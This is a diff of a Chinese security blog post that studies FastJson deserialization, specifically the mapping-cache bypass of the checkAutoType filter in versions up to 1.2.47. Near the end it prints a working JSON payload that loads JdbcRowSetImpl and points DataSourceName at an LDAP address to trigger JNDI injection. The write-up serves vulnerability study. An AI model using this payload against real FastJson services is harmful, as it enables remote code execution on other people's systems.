-<h3 id="mapping缓存绕过流程"><a href="#mapping缓存绕过流程" class="headerlink" title="mapping缓存绕过流程"></a>mapping缓存绕过流程</h3><p>首先看看这个mapping缓存能否可控，查看usages<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/53.png"><br>几经寻找我们能够控制类名指定加载的方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/54.png"><br>也终于还是fastjson包里面的TypeUtils类种找到了符合条件的地方<br>我们跳到源码处（Type.Utils::loadClass)，只查看关键部分，也就是我们mapping.put的地方<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/55.png">)<br>这里就是加载过后将我们本次加载的类放进mapping的缓存<br>那么接下来就是找哪里调用了这个loadClass了，并且参数可控<br>最为理想的是MiscCodec类中的这个deserialze方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/56.png"></p>
-<p>我们跟进到源码，也就是直接调用loadClass的地方<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/57.png"><br>他这里的代码逻辑是说，当我们传进来的类型是Class的时候，就调用loadClass。注意此时loadClass类中有个strval参数，我们跟进到loadClass<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/58.png"><br>会发现strval被指定加载之前，会被直接放进mapping缓存<br>然后我们回到获取反序列化器的ParserConfig类，发现在默认的deserializers键值对中已经存入了Class类型匹配MiscCodec类型的解析器<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/59.png"><br>所以可以触发后续的流程<br>其实到这就差不多了<br>我们可以来捋一捋思路<br>首先肯定要先传入一个Class类型的对象，那么在经过checkAutoType方法的时候就肯定可以返回了Class类了，而不是被waf掉<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/60.png"><br>然后就是获取反序列化器进行反序列化，我们这边看到它的deserializer是MiscCodec<br>然后调用MiscCodec的deserialze方法<br>跟进到如下内容，它会先判断有没有val变量<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/61.png"></p>
-<p>之后就是将我们的val变量中的指定类实例化<br>这个实例化的过程肯定是走到了typeUtils的loadClass方法<br>类加载一遍之后放入缓存 mapping<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/62.png"></p>
+<h3 id="mapping缓存绕过流程"><a href="#mapping缓存绕过流程" class="headerlink" title="mapping缓存绕过流程"></a>mapping缓存绕过流程</h3><p>首先看看这个mapping缓存能否可控，查看usages<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/53.png"><br>几经寻找我们能够控制类名指定加载的方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/54.png"><br>也终于还是fastjson包里面的TypeUtils类种找到了符合条件的地方<br>我们跳到源码处（Type.Utils::loadClass)，只查看关键部分，也就是我们mapping.put的地方<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/55.png">)<br>这里就是加载过后将我们本次加载的类放进mapping的缓存<br>那么接下来就是找哪里调用了这个loadClass了，并且参数可控<br>最为理想的是MiscCodec类中的这个deserialze方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/56.png"></p>
+<p>我们跟进到源码，也就是直接调用loadClass的地方<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/57.png"><br>他这里的代码逻辑是说，当我们传进来的类型是Class的时候，就调用loadClass。注意此时loadClass类中有个strval参数，我们跟进到loadClass<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/58.png"><br>会发现strval被指定加载之前，会被直接放进mapping缓存<br>然后我们回到获取反序列化器的ParserConfig类，发现在默认的deserializers键值对中已经存入了Class类型匹配MiscCodec类型的解析器<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/59.png"><br>所以可以触发后续的流程<br>其实到这就差不多了<br>我们可以来捋一捋思路<br>首先肯定要先传入一个Class类型的对象，那么在经过checkAutoType方法的时候就肯定可以返回了Class类了，而不是被waf掉<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/60.png"><br>然后就是获取反序列化器进行反序列化，我们这边看到它的deserializer是MiscCodec<br>然后调用MiscCodec的deserialze方法<br>跟进到如下内容，它会先判断有没有val变量<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/61.png"></p>
+<p>之后就是将我们的val变量中的指定类实例化<br>这个实例化的过程肯定是走到了typeUtils的loadClass方法<br>类加载一遍之后放入缓存 mapping<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/62.png"></p>
 <p>然后呢我们又指定加载一次<br>com.sun.rowset.JdbcRowSetImpl类，并且后续的DataSourceName于autoCommit的值还是照旧，就能够从缓存中直接读到JdbcRowSetImpl的类加载，绕过waf，后面流程就是一样了，三次for循环取setter 静态变量 getter，之后依次调用取得的setter和getter</p>
 <p>所以可以据此得到EXP</p>
 <pre><code class="java">import com.alibaba.fastjson.JSON;  
@@ -757,394 +633,148 @@ JSON.parseObject(s);
 <pre><code class="json">&quot;&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8086/RibRzWTk\",\"autoCommit\":0&#125;&#125;&quot;
 </code></pre>
 <p>val是MiscCodec中loadclass需要的对象<br>然后第二次JSON数据就是跟低版本的payload一样了</p>
-
-        </div>
-
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">stoocea</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html')">FastJson反序列化学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=undefined&amp;url=http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html&amp;pic=undefined" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">stoocea</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/JNDI%E6%B3%A8%E5%85%A5.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JNDI初步学习</div></div></a></div><div class="next-post pull-right"><a href="/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">tomcat内存马学习（未完全）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">time thicking away</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-FastJson%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">1.FastJson概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">fastjson简单实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson%E6%A0%B9%E6%8D%AE%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">FastJson根据字符串任意反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">FastJson反序列化流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#type%E6%8C%87%E5%AE%9A%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">@type指定加载类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%8C%87%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%8F%82%E6%95%B0%E5%A4%84%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">对指定类的参数处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9E%84%E9%80%A0%E5%99%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">获取构造器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%9E%84%E9%80%A0%E5%99%A8%E7%9A%84deserialze%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E6%9C%80%E7%BB%88%E8%A7%A3%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">调用构造器的deserialze方法进行最终解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">FastJson流程总结以及漏洞点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E7%9A%84%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">FastJson漏洞利用前的流程总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">FastJson反序列化漏洞攻击利用总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB-JdbcRowSetImpl%E5%88%86%E6%9E%90"><span class="toc-number">5.1.</span> <span class="toc-text">入口类 JdbcRowSetImpl分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88Bcel%EF%BC%89%E5%85%A5%E5%8F%A3%E7%B1%BBClassLoaderEXP%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">（Bcel）入口类ClassLoaderEXP分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">FastJson高版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25%E4%B9%8B%E5%90%8E%E7%9A%84%E6%96%B0%E5%A2%9Ewaf%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">1.2.25之后的新增waf检测流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mapping%E7%BC%93%E5%AD%98%E7%BB%95%E8%BF%87%E6%B5%81%E7%A8%8B"><span class="toc-number">6.2.</span> <span class="toc-text">mapping缓存绕过流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">FastJson快速复习总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson1-2-24%E6%B5%81%E7%A8%8B"><span class="toc-number">7.1.</span> <span class="toc-text">FastJson1.2.24流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">7.1.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bcel"><span class="toc-number">7.1.2.</span> <span class="toc-text">Bcel</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson"><span class="toc-number">7.2.</span> <span class="toc-text">FastJson&lt;&#x3D;1.2.47高版本绕过</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html" title="tomcat内存马学习（未完全）">tomcat内存马学习（未完全）</a><time datetime="2023-11-23T09:50:51.000Z" title="发表于 2023-11-23 17:50:51">2023-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="FastJson反序列化学习">FastJson反序列化学习</a><time datetime="2023-11-10T03:09:51.000Z" title="发表于 2023-11-10 11:09:51">2023-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/JNDI%E6%B3%A8%E5%85%A5.html" title="JNDI初步学习">JNDI初步学习</a><time datetime="2023-11-01T17:37:51.000Z" title="发表于 2023-11-02 01:37:51">2023-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/RMI%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93.html" title="RMI的基本攻击方式总结">RMI的基本攻击方式总结</a><time datetime="2023-10-24T15:35:51.000Z" title="发表于 2023-10-24 23:35:51">2023-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/blog%E8%BF%81%E7%A7%BB%E5%8A%A8%E6%80%81%E4%BB%A5%E5%8F%8A%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B.html" title="blog迁移动态以及最近的事">blog迁移动态以及最近的事</a><time datetime="2023-08-15T12:31:51.000Z" title="发表于 2023-08-15 20:31:51">2023-08-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="stoocea" target="_blank">stoocea</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("03/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
         
-            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
-    <ul>
-        <li><strong>标题:</strong> FastJson反序列化学习</li>
-        <li><strong>作者:</strong> stoocea</li>
-        <li><strong>创建于
-                :</strong> 2023-11-10 11:09:51</li>
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
